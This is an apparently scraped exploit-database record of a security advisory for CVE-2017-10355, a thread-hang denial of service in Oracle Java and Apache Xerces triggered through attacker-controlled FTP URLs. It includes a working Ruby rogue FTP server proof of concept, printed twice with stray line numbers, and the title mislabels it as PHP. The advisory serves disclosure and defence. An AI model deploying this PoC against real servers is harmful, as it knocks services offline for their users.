{
    "text": "ecve : CVE-2017-10355 ， title : Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server Side Denial of Service - PHP dos Exploit ， verified : Not Verified ， exploit_detail : Vulnerabilities Summary ， The following advisory describes two ( 2 ) vulnerabilities found in Oracle Java JDK/JRE ( 1.8.0.131 and previous versions ) packages and Apache Xerces ( 2.11.0 )  ， The vulnerabilities are :  ， Oracle JDK/JRE Concurrency-Related Denial of Service ， java.net.URLConnection ( with no setConnectTimeout ) Concurrency-Related Denial of Service ， Credit ， An independent security researcher has reported this vulnerability to Beyond Securitys SecuriTeam Secure Disclosure program ， Vendor response ， Update 1 : Oracle has released patches to address this vulnerability and assigned CVE-2017-10355 ， Oracle acknowledged receiving the report , and has assigned it a tracking number : S0876966. We have no further information on patch availability or a workaround. ， Vulnerabilities Details ， These two vulnerabilities can be triggered to cause a Denial of Service against a server , under the following conditions :  ， An attacker can pass an URL parameter that points to a controlled FTP server to the target ， Target server uses vulnerable component ( s ) to fetch the resource specified by the attacker ， Target server does not prevent fetching of FTP URI resources ， In both vulnerabilities , the attack sequence is the following :  ， Attacker forces vulnerable target server to parse an FTP URL which points to an attackers controlled FTP server ， Target server fetches FTP resource provided by attacker ， Attackers FTP server abruptly exits , leaving the Java process on target server with two internal threads in an infinite waiting status ， If the Java process is single-threaded , then it cannot further process any other client requests , reaching a Denial of Service condition with only one request from the attacker ， In case of a multi-threading process , then it is possible to use the same technique and reach a Denial of Service condition of all available threads , by issuing one request for each available thread ， The attackers controlled FTP server has to abruptly exit when the Java client will perform a RETR FTP command. This behavior is not properly handled and causes a thread concurrency Denial of Service. ， For example :  ， require 'socket' ， ftp_server = TCPServer.new 21 ， Thread.start do ， loop do ， Thread.start ( ftp_server.accept ) do | ftp_client |  ， puts \"FTP. New client connected\" ， ftp_client.puts ( \"220 ftp-server\" )  ， counter = 0 ， loop { ， req = ftp_client.gets (  )  ， puts \"< \"+req ， ftp_client.puts ( \"331 password\" )  ， ftp_client.puts ( \"230 Waiting data\" )  ， counter = counter + 1 ， abort ， end ， end ， puts \"Aborted...\" ， end ， end ， end ， loop do ， sleep ( 50000 )  ， end ， 10 ， 12 ， 13 ， 14 ， 15 ， 16 ， 17 ， 18 ， 19 ， 20 ， 21 ， 23 ， 24 ， 25 ， 26 ， 27 ， 28 ， 29 ， 30 ， 31 ， 32 ， 34 ， require 'socket' ， ftp_server = TCPServer.new 21 ， Thread.start do ， loop do ， Thread.start ( ftp_server.accept ) do | ftp_client |  ， puts \"FTP. New client connected\" ， ftp_client.puts ( \"220 ftp-server\" )  ， counter = 0 ， loop { ， req = ftp_client.gets (  )  ， puts \"< \"+req ， ftp_client.puts ( \"331 password\" )  ， ftp_client.puts ( \"230 Waiting data\" )  ， counter = counter + 1 ， abort ， end ， end ， puts \"Aborted...\" ， end ， end ， end ， loop do ， sleep ( 50000 )  ， end ， When triggered , the DoS will result in a CLOSE_WAIT status on the connection between the target server and the FTP server ( 192.168.234.134 )  , leaving the Java process thread stuck. ， Oracle JDK/JRE Concurrency-Related Denial of Service ， The vulnerable functions are :  ， java.io.InputStream ， java.xml.ws.Service ， javax.xml.validation.Schema ， javax.xml.JAXBContext ， java.net.JarURLConnection The setConnectionTimeout and setReadTimeout are ignored ， javax.imageio.ImageIO ， Javax.swing.ImageIcon ， javax.swing.text.html.StyleSheet ， java.io.InputStream",
    "time": "2017-08-30"
}